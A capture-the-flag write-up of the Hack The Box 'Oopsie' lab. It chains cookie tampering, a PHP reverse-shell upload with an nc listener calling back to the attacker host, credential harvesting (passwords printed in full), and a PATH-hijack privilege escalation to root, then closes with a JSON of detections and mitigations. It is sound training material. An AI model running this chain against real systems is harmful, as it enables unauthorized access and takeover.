# HTB Oopsie - Auth Bypass, Upload RCE, and SUID PATH Hijack

Scope: authorized HTB lab only.
Focus: cookie-based privilege bypass, arbitrary file upload to RCE, credential harvesting, and root escalation via PATH hijack.

---

## 1. Investigation Objective

1. Identify exposed web and SSH services.
2. Discover hidden application routes.
3. Abuse authorization logic (cookie/session data).
4. Execute code through upload surface.
5. Escalate from web user to local user and then root.

---

## 2. Recon and Surface Discovery

```bash
nmap -A <TARGET_IP>
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html
```

Typical findings:
- OpenSSH on 22
- Apache/PHP on 80
- web routes include `/administrator`, `/uploads`, and login endpoint under `/cdn-cgi/login/`

---

## 3. Authorization Bypass via ID/Cookie Manipulation

Observed behavior:
- guest session exposes account metadata (e.g., account/access IDs)
- changing `id` parameter from user context to admin context reveals elevated identifiers
- updating cookie values with admin-associated ID/role enables upload functionality

Impact:
- server-side authorization trust is tied to tamperable client-side state.

---

## 4. Upload Execution and Foothold

Upload test payload in lab context:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

Configure callback in payload and start listener:

```bash
nc -nvlp 1337
```

Trigger uploaded script:

```text
http://<TARGET_IP>/uploads/shell.php
```

Stabilize shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 5. Credential Harvesting and User Pivot

From web root/app files, search for credentials:

```bash
cd /var/www/html
grep -RIn "passw\|user\|credential\|db_" . 2>/dev/null
```

Recovered artifacts in common Oopsie flow:
- web/admin credential-like string: `admin:MEGACORP_4dm1n!!`
- system user credential: `robert:M3g4C0rpUs3r!`

Pivot:

```bash
su robert
cat /home/robert/user.txt
```

---

## 6. Privilege Escalation via bugtracker PATH Hijack

Enumeration:

```bash
id
find / -group bugtracker 2>/dev/null
```

If `bugtracker` binary executes `cat` without absolute path under elevated context, exploit path order:

```bash
echo '/bin/sh' > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH
bugtracker
```

Then verify root context and read root artifact.

---

## 7. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -A 10.129.95.191
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH ...
80/tcp open  http    Apache ...

analyst@kali:~$ gobuster dir -u http://10.129.95.191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html
/uploads               (Status: 301)
/administrator         (Status: 301)
/cdn-cgi/login/index.php (Status: 200)

Browser/Burp evidence:
- id parameter tampering (2 -> 1) exposes admin access identifier
- modified cookie grants upload capability

analyst@kali:~$ nc -nvlp 1337
connect to [10.10.14.6] from (UNKNOWN) [10.129.95.191]
$ whoami
www-data

$ grep -RIn "passw" /var/www/html 2>/dev/null
... robert:M3g4C0rpUs3r! ...

$ su robert
Password: M3g4C0rpUs3r!
robert@oopsie:~$ id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)

robert@oopsie:~$ find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker

robert@oopsie:~$ echo '/bin/sh' > /tmp/cat && chmod +x /tmp/cat
robert@oopsie:~$ export PATH=/tmp:$PATH
robert@oopsie:~$ bugtracker
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 8. Analyst Reasoning Chain (Dataset-Style)

```json
{
	"scenario": "oopsie_cookie_bypass_upload_rce_suid_path_hijack",
	"input_signals": [
		"Web app trust on client-side cookie/id values",
		"Upload endpoint accessible after role/ID tampering",
		"Uploaded PHP payload executed on server",
		"Credentials found in web application files",
		"bugtracker binary execution path vulnerable to PATH hijack"
	],
	"attack_chain": [
		{
			"step": 1,
			"tactic": "initial_access",
			"technique": "Authentication/Authorization Bypass",
			"confidence": 0.9,
			"evidence": "cookie and id tampering unlocked restricted upload feature"
		},
		{
			"step": 2,
			"tactic": "execution",
			"technique": "Arbitrary File Upload to Code Execution",
			"confidence": 0.92,
			"evidence": "reverse shell obtained from uploaded php file"
		},
		{
			"step": 3,
			"tactic": "credential_access",
			"technique": "Credentials in Files",
			"confidence": 0.88,
			"evidence": "robert credential recovered from application content"
		},
		{
			"step": 4,
			"tactic": "privilege_escalation",
			"technique": "PATH Hijack of Elevated Binary",
			"confidence": 0.91,
			"evidence": "bugtracker invoked attacker-controlled cat binary from /tmp"
		}
	],
	"hypotheses": [
		"Additional role checks may trust mutable client-side fields",
		"Other uploaded filetypes may be executable depending on server config",
		"Similar PATH misuse may exist in other custom SUID/group binaries"
	],
	"uncertainties": [
		"Extent of session integrity controls (HMAC/signature) not fully analyzed",
		"Credential reuse scope beyond local host not validated",
		"No direct evidence of upload scanning or WAF protection"
	],
	"tool_calls": [
		{"name": "session_state_integrity_tester", "priority": "high"},
		{"name": "upload_execution_validator", "priority": "high"},
		{"name": "suid_path_hijack_scanner", "priority": "medium"}
	],
	"mitigation": {
		"immediate": [
			"Move authorization checks fully server-side and invalidate tampered sessions",
			"Disable executable uploads and restrict upload directories",
			"Rotate exposed credentials from source code/config files"
		],
		"hardening": [
			"Store secrets outside web root and use centralized secret management",
			"Enforce strict allowlist validation on uploaded file content and extension",
			"Use absolute paths in privileged binaries and sanitize environment variables"
		],
		"monitoring": [
			"Alert on role/id cookie anomalies and privilege escalation jumps",
			"Track execution attempts from upload directories",
			"Monitor PATH/environment manipulation by non-privileged users"
		]
	}
}
```
